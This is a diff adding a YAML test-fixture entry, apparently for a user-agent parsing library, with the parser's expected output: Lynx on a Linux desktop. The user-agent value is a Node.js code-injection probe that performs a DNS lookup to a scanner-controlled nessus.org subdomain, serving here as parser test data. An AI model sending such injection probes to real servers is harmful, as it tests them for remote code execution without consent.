@@ -416,3 +416,41 @@
     name: Text
     version: null
     manufacturer: unknown
+-
+  headers:
+    user-agent: "const tnbdns = require('dns');  tnbdns.lookup('tlnu3wwhi6f5xbtg5zm6v23sga25drdlltiuou53yzdvu2lynxwa'+'.was.nessus.org', function(err, result) { console.log(result) })"
+  device:
+    architecture: null
+    deviceName: 'general Desktop'
+    marketingName: 'general Desktop'
+    manufacturer: unknown
+    brand: unknown
+    dualOrientation: false
+    simCount: 0
+    display:
+      width: null
+      height: null
+      touch: false
+      size: null
+    type: desktop
+    ismobile: false
+    istv: false
+    bits: null
+  os:
+    name: Linux
+    marketingName: Linux
+    version: null
+    manufacturer: linux-foundation
+    bits: null
+  client:
+    name: Lynx
+    modus: null
+    version: null
+    manufacturer: thomas-dickey
+    type: browser
+    isbot: false
+    bits: null
+  engine:
+    name: null
+    version: null
+    manufacturer: unknown
